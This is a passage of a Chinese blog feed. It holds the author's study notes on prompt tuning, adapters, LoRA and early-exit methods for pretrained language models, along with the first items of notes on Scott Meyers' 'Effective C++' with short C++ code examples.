id="结论">结论</span></h3><ul><li>原则上，<code>emplace_back</code>有时会比<code>push_back</code>高效，并且不会更差。</li><li>实际上，当以下条件满足时，<code>emplace_back</code>更快：（1）值被构造到容器中，而不是直接赋值；（2）传入的类型与容器的元素类型不一致；（3）容器不拒绝已经存在的重复值。</li><li><code>emplace_back</code>可能执行<code>push_back</code>拒绝的类型转换。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> Book </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Prompt, Adaptor, ...</title>
      <link href="/posts/7695beab.html"/>
      <url>/posts/7695beab.html</url>
      
        <content type="html"><![CDATA[<p>预训练模型没有那么完美，其中两个问题：一，面对数据稀缺的情况，微调效果很可能一般；二，模型参数量大，存储空间占用较大，计算量大。目前相应的对策，效果较好的有：Prompt取代fine-tuning，设计Apdater减少模型训练参数。</p><h2><span id="prompt">Prompt</span></h2><p>设计fine-tuning输入模板，让模型根据上下文填充MASK。</p><blockquote><p>Input: [CLS] The spring break is coming soon.[<strong>MASK</strong>]. the spring break was over? | Label: no</p><p>Input: [CLS] I am going to have dinner. [<strong>MASK</strong>]. I amgoing to eat something? | Label: yes</p></blockquote><p>MASK 部分可以是多个词，长度可调。</p><p>如何加入任务label信息？通过 verbalizer，将 MASK部分预测的词与label的单词形成一个map。预测的时候，根据预测的词和map，找到对应的label。</p><p>通过预训练model，自己学习处任务相关的prompt。充分利用预训练信息，这种方式看起来是不错的。</p><p>问题来了，怎么确定一个好的 verbalizer mapping ？</p><h3><span id="petpattern-exploitingtraining">PET(Pattern-ExploitingTraining)</span></h3><p><a href="https://aclanthology.org/2021.eacl-main.20.pdf" target="_blank" rel="noopener">PET</a>方案（少量样本半监督情景）：</p><ol type="1"><li>在监督数据上，进行多个Prompt范式tuning，得到多组 prompt单词，分别对应到相应的label。</li><li>在无监督数据上，多个模型进行预测，每个模型分别在各自的 prompt单词候选集中，进行输出的softmax。多个模型结果取平均，得到softlabel。（蒸馏也用这招，一些半监督或者模型精调都有用到这种方法）。</li><li>联合监督数据和无监督数据，进行训练得到最终的模型。</li></ol><h3><span id="ipet-iterative-pet">iPET (Iterative PET)</span></h3><p>PET 作者对 PET 的改进版。只是将 PET的三步，进行多轮，同时增大labelmapping的范围。实验效果，在小样本场景下是超过 fine-tuning的。但是，这对比实验，有点不公平。因为是在 fine-tuning并没精心设计过的条件下的比较。</p><p>另外，PET多个模型训练的时间成本和资源消耗明显更高。那么，这些成本转换成对fine-tuning方式下，构建人工标注数据的成本呢？又该怎么说？是不是还简单直接一些？</p><h3><span id="lm-bffbetterfew-shot-fine-tuning-of-language-models">LM-BFF(betterfew-shot fine-tuning of language models)</span></h3><p><a href="https://aclanthology.org/2021.acl-long.295.pdf" target="_blank" rel="noopener">LM-BFF</a>则是另一种思路，增加更多的提示信息，输入到model。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2022/04/07/20-29-01-558987.png" srcset="/img/loading.gif" lazyload style="zoom:60%;"></p><p>将上图改为：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2022/04/07/20-30-44-1c0005.png" srcset="/img/loading.gif" lazyload style="zoom:80%;"></p><p>后面加上了一组示例输入，作为一种显示提示。和GPT3的方式有点像。但是LM-BFF对模型进行训练的数据，有梯度更新。GPT3没有梯度更新，只是生成模型的inference提示。</p><p>这里的 mapping设计方式，论文使用了人工设计和模型自己学习推断两种方法。效果这能说相差无几。</p><h3><span id="multitask-prompt">Multitask Prompt</span></h3><p><a href="%5B%5B2110.08207%5D%20Multitask%20Prompted%20Training%20Enables%20Zero-Shot%20Task%20Generalization%20(arxiv.org)%5D(https://arxiv.org/abs/2110.08207)">MultitaskPrompt</a> 使用多任务的方式，每个任务设计一个 prompttemplate，进行学习。然后在模型没有见过的任务上，再进行promptinference，期望模型实现 zero-shotinference。论文实验结果显示，使用T5或者T0模型进行多任务Prompt，更少的参数量就可以达到甚至超过GPT3的效果。</p><blockquote><p><a href="https://github.com/bigscience-workshop/t-zero" target="_blank" rel="noopener">T0 Promptrepo</a></p><p>Other multitask based：</p><ul><li><a href="https://arxiv.org/abs/2110.07904#:~:text=SPoT%3A%20%EE%80%80Better%20Frozen%20Model%20Adaptation%20through%20Soft%20Prompt,learns%20task-specific%20%EE%80%80soft%EE%80%81%20prompts%20to%20condition%20a%20">SPoT</a></li><li><a href="https://www.arxiv-vanity.com/papers/2110.07602/#:~:text=We%20present%20P-tuning%20v2%2C%20a%20prompting%20method%20that,adapted%20one%20of%20prefix-tuning%20and%20deep%20prompt%20tuning.">P-tuningv2</a></li></ul></blockquote><h3><span id="参数化-prompt">参数化 Prompt</span></h3><p>设计 verbalizer 显然不够 AI。有研究者就直接时用可训练的 token 来替代prompt，直接训练 token 对应的特殊的 embedding。</p><p>对于 GPT 这种自回归模型，设计 prefix token，加在输入 sentence之前；对于 T5、BART 这类Encoder-Decoder 模型，在Encoder和Decoder两边加上prefix-E 和 prefix-D。训练时将原预训练模型参数freeze。</p><p>还有像 P-tuning 这样的方法，使用 LSTM 对 Prompt输入进行额外编码。同时开放 原预训练模型参数进行训练。效果不错，超越了fine-tuning 效果。但是这个方法训练起来的成本显然比较高。</p><h3><span id="tricks">Tricks</span></h3><p>prompt 单词使用 label 单词初始化，效果相比随机初始化要好。</p><h2><span id="adaptor">Adaptor</span></h2><p>Parameter-EfficientFine-tuning，不训练原预训练模型的参数，只训练设计的 Adaptor结构的参数。</p><p>fine-tuning 的想法是训练原模型参数，产生相应任务的有效 hiddenrepresentation。但是 Adaptor 是固定原模型参数，设计结构在原 hiddenrepresentation 基础上得到任务相关的 hidden representation。</p><p><a href="https://github.com/Adapter-Hub/adapter-transformers">工具库</a></p><h3><span id="adaptor">Adaptor</span></h3><p><a href="http://proceedings.mlr.press/v97/houlsby19a/houlsby19a.pdf#:~:text=Parameter-Ef%EF%AC%81cient%20Transfer%20Learning%20for%20NLP%20Both%20feature-based%20transfer,adapter%20tuning%20method%20is%20even%20more%20parameter%20ef%EF%AC%81cient.">Adaptor</a></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2022/04/07/21-39-16-15ceaa.png" srcset="/img/loading.gif" lazyload style="zoom:80%;"></p><p>只训练 Adapter 层参数。更少的训练参数，更好的训练效果。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2022/04/07/21-44-43-eeebc8.png" srcset="/img/loading.gif" lazyload style="zoom:67%;"></p><h3><span id="loralow-rank-adaptation">LoRA(Low-Rank Adaptation)</span></h3><p><a href="https://arxiv.org/abs/2106.09685v1" target="_blank" rel="noopener">LoRA</a></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2022/04/07/21-47-19-e9b041.png" srcset="/img/loading.gif" lazyload style="zoom:80%;"></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2022/04/07/21-48-52-4a055f.png" srcset="/img/loading.gif" lazyload style="zoom:33%;"></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2022/04/07/21-49-24-ec0cf4.png" srcset="/img/loading.gif" lazyload style="zoom:33%;"></p><p>只在 Feed-forward 层，增加 Low-Rank Adaptation。</p><h3><span id="prefix-tuning">Prefix Tuning</span></h3><p><a href="https://arxiv.org/abs/2101.00190v1#:~:text=Prefix-Tuning%3A%20Optimizing%20Continuous%20Prompts%20for%20Generation%20Xiang%20Lisa,necessitates%20storing%20a%20full%20copy%20for%20each%20task.">PrefixTuning</a> 是 Prompt 中的一种方法，它也是高效训练的一种设计。只更新Prefix 的参数。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2022/04/07/21-57-55-638843.png" srcset="/img/loading.gif" lazyload style="zoom:70%;"></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2022/04/07/21-59-00-e61639.png" srcset="/img/loading.gif" lazyload style="zoom:67%;"></p><p>另外，使用了这种形式的 Prompt Tuning对于多任务训练，有更高的效率。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2022/04/07/22-09-39-cd7905.png" srcset="/img/loading.gif" lazyload style="zoom:70%;"></p><p>直接将不同的 prefix 一起多任务训练。这比 PET这种“老古董模型”效率上强多了。<a href="https://arxiv.org/pdf/2104.08691v2.pdf">ref</a></p><h3><span id="混合型">混合型</span></h3><p><a href="https://arxiv.org/pdf/2110.04366v1.pdf" target="_blank" rel="noopener">TOWARDS A UNIFIEDVIEW OF PARAMETER-EFFICIENT TRANSFER LEARNING</a>结合了几种常见方法：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2022/04/07/22-01-45-61d48c.png" srcset="/img/loading.gif" lazyload style="zoom:80%;"></p><p>得到更好的效果。另外总结了几种常见的形式。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2022/04/07/22-03-22-9ae2f7.png" srcset="/img/loading.gif" lazyload style="zoom:80%;"></p><h3><span id="early-exit">Early Exit</span></h3><p>另一种思路，不是 Adaptor 类型的，但是放在这里一起对比了。</p><p>这种方法认为，模型在越高的层的输出存在 over thinking的可能。所以，考虑提前结束训练，在较低的层就输出。</p><p>有几种方法：</p><h4><span id="multi-exit">Multi Exit</span></h4><p>在每一层都设置一个输出层，联合每一层输出进行损失计算，并给更高的层更大的权重。最后选择其中一层最为inference 输出。可以指定某一层。动态输出的方法有下面几种。</p><h4><span id="shallow-deep">Shallow-deep</span></h4><p><a href="http://proceedings.mlr.press/v97/kaya19a/kaya19a.pdf">Shallow-deep</a>其中使用方法是，对于每一层分类结果，选择第一个大于某个阈值的层，进行最终输出。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2022/04/07/22-26-13-68339e.png" srcset="/img/loading.gif" lazyload style="zoom:67%;"></p><h4><span id="deebert">DeeBERT</span></h4><p><a href="https://arxiv.org/pdf/2004.12993.pdf" target="_blank" rel="noopener">DeeBERT</a>相比Shallow-deep，只是指标不一样，使用entropy进行比较。</p><h4><span id="pabee">PABEE</span></h4><p><a href="https://papers.nips.cc/paper/2020/file/d4dd111a4fd973394238aca5c05bebe3-Paper.pdf">PABEE</a>思路比较简单，模型从下往上层，连续输出同一个 label的次数超过限制，就进行输出。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2022/04/07/22-30-57-1ddf49.png" srcset="/img/loading.gif" lazyload style="zoom:50%;"></p><p>对于分类任务，次数限制设计为:</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2022/04/07/22-31-29-6a743b.png" srcset="/img/loading.gif" lazyload style="zoom:80%;"></p><p>回归任务：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2022/04/07/22-32-19-ca7a9c.png" srcset="/img/loading.gif" lazyload style="zoom:80%;"></p><h3><span id="其他">其他</span></h3><p>Apdaptor设计方式，在实验中更不易过拟合，并且模型迁移训练效果更好。对于小数据集也有不错的效果。</p><h2><span id="长序列优化">长序列优化</span></h2><p>主要针对 self-attention 在长序列任务上的大计算量进行设计优化。</p><p>思路有几种：</p><ol type="1"><li>Longformer, BigBird: 更改attention window，设计局部 attention，空洞attention，随机 attention，以及只对部分词进行全局attention，这些方法一起使用。</li><li>Reformer：对key 和 query先进性内存聚类，再按簇进行attention。</li><li>Linformer：对key进行线性变换，降低key的个数。</li><li>Efficient attention，LinearTransformer，Performer：将query和key的矩阵计算，经过一个<strong>变量</strong>分解，因为长序列这两个的计算量会O(n^2)级变大，而且这是可以通过类似核函数的方法进行分解的。将key和value的计算先进性，有效减少计算量。关键就是这个<strong>变换</strong>的设计形式。</li><li>Synthesizer：不计算得到 attention weights了，直接设为设计的固定参数矩阵。</li><li>MLP-Mixer，Fnet：attentionfree，直接不attention了，使用其他方式。不同维度全连接层融合，或者转化到“频域”进行融合。</li></ol><p>有空整理。</p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> NLP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nlp </tag>
            
            <tag> prompt </tag>
            
            <tag> adaptor </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Effective Cpp</title>
      <link href="/posts/95b1972c.html"/>
      <url>/posts/95b1972c.html</url>
      
        <content type="html"><![CDATA[<h2><span id="一-习惯c">一、习惯C++</span></h2><h3><span id="条款01视c为一个语言联邦"><strong>条款01：视C++为一个语言联邦</strong></span></h3><p>C++已经是个多重范型编程语言（multiparadigmprogramminglanguage），一个同时支持过程形式（procedural）、面向对象形式（object-oriented）、函数形式（functional）、泛型形式（generic）、元编程形式（metaprogramming）的语言。</p><p>C++的重要组成：C、Object-Oriented C++、Template C++、STL。</p><p>C++是包含四种次语言的一体多面语言，关键看你怎么用。</p><blockquote><p>比如，只在C语言部分，pass-by-value通常比pass-by-reference高效，但在面向对象部分，正好相反，pass-by-reference-to-const是相对更好的选择。</p><p>而在STL中，迭代器和函数对象是在Cpointer之上，所以pass-by-value更高效。</p></blockquote><h3><span id="条款02尽量以constenuminline替换define"><strong>条款02：尽量以const，enum，inline替换＃define</strong></span></h3><p>“宁可让编译器替换预处理器”。</p><ul><li>对于单纯常量，最好以const对象或enums替换 #define。</li><li>对于形似函数的宏（macros），最好改用inline函数替换#define，避免出错。</li><li>#ifdef / #ifndef 继续扮演控制编译的重要角色。</li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-keyword">const</span> <span class="hljs-keyword">double</span> Ratio = <span class="hljs-number">1.5</span>;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> RATIO 1.5</span><br></code></pre></div></td></tr></table></figure><p>在编译器错误处理时，#define不会告诉你 RATIO的出现信息，而是被替换的1.5。</p><p>enum 可以作为一种inclass常量初值设定的方式。这样就取不到成员变量的地址。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Player</span>&#123;</span><br><span class="hljs-keyword">private</span>:<br><span class="hljs-keyword">enum</span>  &#123;NumTurns = <span class="hljs-number">5</span>;&#125;;<br>...<br>&#125;;<br></code></pre></div></td></tr></table></figure><h3><span id="条款03尽可能使用const"><strong>条款03：尽可能使用const</strong></span></h3><p>如果关键字const出现在星号左边，表示被指物是常量；如果出现在星号右边，表示指针自身是常量；如果出现在星号两边，表示被指物和指针两者都是常量。</p><p>将const实施于成员函数的目的，是为了确认该成员函数可作用于const对象身上。</p><p>这一类成员函数之所以重要，基于两个理由。第一，它使 class接口比较容易被理解。这是因为，得知哪个函数可以改动对象内容而哪个函数不行，很是重要。第二，它使“操作const对象”成为可能。</p><p>两个成员函数如果只是常量性（constness）不同，也可以被重载。比如<code>const T&amp; getXXX() const;</code>和<code>T&amp; getXXX();</code></p><p>在const成员函数需要被修改的变量，使用mutable修饰。mutable释放掉non-static成员变量的bitwiseconstness约束。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CBook</span>&#123;</span><br>...<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-keyword">size_t</span> <span class="hljs-title">len</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span></span>;<br><br><span class="hljs-keyword">private</span>:<br><span class="hljs-keyword">mutable</span> <span class="hljs-built_in">std</span>::<span class="hljs-keyword">size_t</span> length;<br><span class="hljs-keyword">mutable</span> <span class="hljs-keyword">bool</span> <span class="hljs-built_in">isValid</span>;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-keyword">size_t</span> <span class="hljs-title">len</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span></span>&#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">isValid</span>)&#123;<br>length = <span class="hljs-built_in">std</span>::<span class="hljs-built_in">strlen</span>(<span class="hljs-built_in">text</span>);<br><span class="hljs-built_in">isValid</span> = <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-keyword">return</span> length;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>利用<code>const_cast</code>将常量性移除，可以运用const成员函数实现出其non-const孪生兄弟。当const和non-const成员函数有着实质等价的实现时，令non-const版本调用const版本可避免代码重复。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CBook</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>&amp; <span class="hljs-keyword">operator</span>[] (<span class="hljs-built_in">std</span>::<span class="hljs-keyword">size_t</span> pos) <span class="hljs-keyword">const</span>&#123;<br>...<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">text</span>[pos];<br>&#125;<br><br><span class="hljs-keyword">char</span>&amp; <span class="hljs-keyword">operator</span>[] (<span class="hljs-built_in">std</span>::<span class="hljs-keyword">size_t</span> pos) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">const_cast</span>&lt;<span class="hljs-keyword">char</span>&amp;&gt;(<br><span class="hljs-keyword">static_cast</span>&lt;<span class="hljs-keyword">const</span> CBook*&gt;(*<span class="hljs-keyword">this</span>)[pos]);<br>&#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>另外，将某些东西声明为 const可帮助编译器侦测出错误用法。const可被施加于任何作用域内的对象、函数参数、函数返回类型、成员函数本体。</p><h3><span id="条款04确定对象被使用前已先被初始化"><strong>条款04：确定对象被使用前已先被初始化</strong></span></h3><p>永远在使用对象之前先将它初始化。确保每一个构造函数都将对象的每一个成员初始化。应该尽量使用initializationlist。</p><p>C++有着十分固定的“成员初始化次序”。base classes更早于其derivedclasses被初始化（见条款12），而class的成员变量总是以其声明次序被初始化。</p><ul><li>为内置型对象进行手工初始化，因为C++不保证初始化它们。</li><li>构造函数最好使用成员初值列（member initializationlist），而不要在构造函数本体内使用赋值操作（assignment）。initializationlist列出的成员变量，其排列次序应该和它们在class中的声明次序相同。</li><li>为免除“跨编译单元之初始化次序”问题，请以localstatic对象替换non-localstatic对象，确保在使用对象前，初始化对象。Singleton模式的一个常见实现手法。</li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileSys</span>&#123;</span>...&#125;;<br><br><span class="hljs-function">FileSys&amp; <span class="hljs-title">tfs</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">static</span> FileSys fs;<br><span class="hljs-keyword">return</span> fs;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Dir</span>&#123;</span>...&#125;;<br><br>Dir::Dir(params)&#123;<br>...<br><span class="hljs-built_in">std</span>::<span class="hljs-keyword">size_t</span> disks = tfs().numDisks();<br>...<br>&#125;<br><br><span class="hljs-function">Dir&amp; <span class="hljs-title">tmpDir</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">static</span> Dir td;<br><span class="hljs-keyword">return</span> td;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2><span id="二-构造析构赋值运算">二、构造/析构/赋值运算</span></h2><h3><span id="条款05了解c默默编写并调用哪些函数"><strong>条款05：了解C++默默编写并调用哪些函数</strong></span></h3><p>编译器就会为它声明（编译器版本的）一个copy构造函数、一个copyassignment操作符和一个析构函数。此外如果你没有声明任何构造函数，编译器也会为你声明一个default构造函数。所有这些函数都是public且inline（见条款30）。</p><p>copy构造函数被用来“以同型对象初始化自我对象”，copyassignment操作符被用来“从另一个同型对象中拷贝其值到自我对象”。copy构造函数是一个尤其重要的函数，因为它定义一个对象如何passedby value 。</p><p>编译器可自动为class创建default构造函数、copy构造函数、copyassignment操作符，以及析构函数。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Empty</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br>Empty() &#123;...&#125;;<br>Empty(<span class="hljs-keyword">const</span> Empty&amp; rhs) &#123;...&#125;;<br>~Empty() &#123;...&#125;;<br><br>Empty&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-keyword">const</span> Empty&amp; rhs) &#123;...&#125;;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="条款06不用默认构造函数时需要明确即拒绝"><strong>条款06：不用默认构造函数时，需要明确即拒绝</strong></span></h3><p>明确声明一个成员函数，可以替代编译器默认版本。</p><p>或者拒绝编译器默认版本，可将相应的成员函数声明为private并且不予实现。</p><p>或者使用delete关键字，明确不使用。</p><h3><span id="条款07为多态基类声明virtual析构函数"><strong>条款07：为多态基类声明virtual析构函数</strong></span></h3><p>当derived class经由一个base class指针被删除时，baseclass若是non-virtual析构函数，则不会执行derivedclass的析构函数，导致内存泄露。</p><p>消除这个问题的做法很简单：给baseclass一个virtual析构函数。此后删除derived class对象就会如你想要的那般。</p><p>对象需要在运行期决定哪一个virtual函数该被调用。由一个所谓vptr（virtualtablepointer）指针指出。vptr指向一个由函数指针构成的数组，称为vtbl（virtualtable）；每一个带有virtual函数的class都有一个相应的vtbl。当对象调用某一virtual函数，实际被调用的函数取决于该对象的vptr所指的那个vtbl——编译器在其中寻找适当的函数指针。</p><p>析构函数的运作方式是，最深层派生（mostderived）的那个class其析构函数最先被调用，然后是其每一个derivedclass的析构函数被调用。</p><blockquote><ul><li><p>如果class带有任何virtual函数，它就应该拥有一个virtual析构函数。</p></li><li><p>Class 的设计目的如果不是作为 base classes使用，或不是为了具备多态性（polymorphical），就不该声明virtual析构函数。</p></li></ul></blockquote><h3><span id="条款08别让异常逃离析构函数"><strong>条款08：别让异常逃离析构函数</strong></span></h3><ul><li>析构函数绝对不要吐出异常。如果一个被析构函数调用的函数可能抛出异常，析构函数应该捕捉任何异常，然后不传递或结束程序。否则可能出现不可预知的风险。</li><li>如果客户需要对某个操作函数运行期间抛出的异常做出反应，那么 class应该提供一个普通函数（而非在析构函数中）执行该操作。</li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DBConn</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br>...<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">close</span><span class="hljs-params">()</span></span>&#123;<br>db.<span class="hljs-built_in">close</span>();  <span class="hljs-comment">// 可能出错</span><br>closed=<span class="hljs-literal">true</span>;<br>&#125;<br><br>~DBConn&#123;<br><span class="hljs-keyword">if</span> (!closed)&#123;<br><span class="hljs-keyword">try</span>&#123;<br>db.closed();<br>&#125;<span class="hljs-keyword">catch</span> (...)&#123;<br>...<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">private</span>:<br>DBConnection db;<br><span class="hljs-keyword">bool</span> closed = <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="条款09绝不在构造和析构过程中调用virtual函数"><strong>条款09：绝不在构造和析构过程中调用virtual函数</strong></span></h3><p>derived class对象内的base class会在derivedclass自身被构造之前先构造。所以调用virtual 函数，derivedclass并为被完全初始化，导致出现参数未初始化错误。</p><p>在derived class对象的base class构造期间，对象的类型是 base class而不是 derived class。不只 virtual 函数会被编译器解析至（resolveto）base class，若使用运行期类型信息（runtimetypeinformation，例如dynamic_cast（见条款27）和typeid），也会把对象视为baseclass类型。</p><p>唯一能够避免此问题的做法就是：确定你的构造函数和析构函数都没有（在对象被创建和被销毁期间）调用virtual 函数。</p><p>在构造函数或者析构函数中调用virtual 函数，不会调用到 derived class层级的函数（只是 base class 那层）。</p><h3><span id="条款10令operator返回一个reference-to-this">**条款10：令operator=返回一个reference to *this**</span></h3><p>为了实现“连锁赋值”，赋值操作符必须返回一个reference指向操作符的左侧实参。令赋值（assignment）操作符返回一个referenceto *this。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br>CC&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-keyword">const</span> CC&amp; rhs)&#123;<br>...<br><span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;<br>&#125;<br>CC&amp; <span class="hljs-keyword">operator</span>+=(<span class="hljs-keyword">const</span> CC&amp; rhs)&#123;<br>...<br><span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;<br>&#125;<br>CC&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-keyword">int</span> rhs)&#123;<br>...<br><span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;<br>&#125;<br>    CC&amp; <span class="hljs-keyword">operator</span>++() &#123;<br>        ...<br>    <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;<br>    &#125;<br>    <span class="hljs-comment">// 后置++，带参，且返回值</span><br>    <span class="hljs-keyword">const</span> CC <span class="hljs-keyword">operator</span>++(<span class="hljs-keyword">int</span>) &#123;<br>        CC tmp = *<span class="hljs-keyword">this</span>;<br>        <span class="hljs-keyword">this</span>-&gt;<span class="hljs-keyword">operator</span>++();<br>        <span class="hljs-keyword">return</span> tmp;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="条款11在operator中处理自我赋值"><strong>条款11：在operator=中处理“自我赋值”</strong></span></h3><p>欲阻止这种错误，传统做法是藉由operator=最前面的一个“证同测试（identitytest）”达到“自我赋值”的检验目的。</p><p>在operator=函数内确保代码不但“异常安全”而且“自我赋值安全”的一个替代方案是，使用所谓的copyand swap技术。不仅解决了代码复用，还保证了赋值操作的安全性。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 